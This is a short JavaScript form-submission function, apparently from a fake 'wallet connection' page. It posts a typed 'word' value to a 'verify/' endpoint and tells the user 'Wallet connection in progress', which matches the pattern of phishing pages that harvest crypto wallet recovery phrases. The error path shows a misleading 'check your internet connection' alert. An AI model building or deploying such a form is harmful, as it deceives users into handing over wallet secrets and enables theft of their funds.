
 function submits() {
         console.log('form submitted')
document.getElementById("wtype").innerHTML='loading..';
         $.ajax({
            type: 'POST',
            url: "verify/",
            data: {
               word: $('#value').val(),
               csrfmiddlewaretoken:$ ("input[name=csrfmiddlewaretoken]").val(), 
               dataType: "json",
               action : 'post'
               
                   },
            success: function(data) {
        	Swal.fire("Success","Wallet connection in progress","success");
            },
            error: function (xhr,errmsg,err) {
               // alert the error if any error occured
               alert(["error check your internet connection"]);
               console.log('form error')
           }
      
       });
      }
 
